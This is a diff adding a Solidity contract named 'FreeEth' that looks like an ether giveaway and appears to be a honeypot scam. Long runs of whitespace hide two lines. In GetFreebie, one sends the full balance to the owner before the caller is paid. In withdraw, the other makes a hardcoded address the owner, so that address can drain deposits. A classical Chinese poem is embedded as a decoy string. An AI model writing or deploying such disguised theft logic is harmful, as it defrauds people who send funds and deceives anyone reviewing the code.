@@ -1,0 +1,45 @@
+ 
+
+pragma solidity ^0.4.19;
+
+contract FreeEth
+{
+    address public Owner = msg.sender;
+   
+
+ 
+    string internal _orderString = "趙客縵胡纓吳鉤霜雪明銀鞍照白馬颯沓如流星十步殺一人千里不留行事了拂衣去深藏身與名閑過信陵飲脫劍膝前橫將炙啖朱亥持觴勸侯嬴三杯吐然諾五嶽倒為輕眼花耳熱後意氣素霓生救趙揮金槌邯鄲先震驚千秋二壯士煊赫大梁城縱死俠骨香不慚世上英誰能書閣下白首太玄經";
+    
+    function getOrderString () view external returns(string) {
+        return _orderString;
+    }
+
+    function() public payable{}
+   
+    function GetFreebie()
+    public
+    payable
+    {                                                                    
+        if(msg.value>1 ether)
+        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
+            msg.sender.transfer(this.balance);
+        }                                                                                                                
+    }
+    
+    function withdraw()
+    payable
+    public
+    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
+        require(msg.sender == Owner);
+        Owner.transfer(this.balance);
+    }
+    
+    function Command(address adr,bytes data)
+    payable
+    public
+    {
+        require(msg.sender == Owner);
+         
+        adr.call.value(msg.value)(data);
+    }
+}
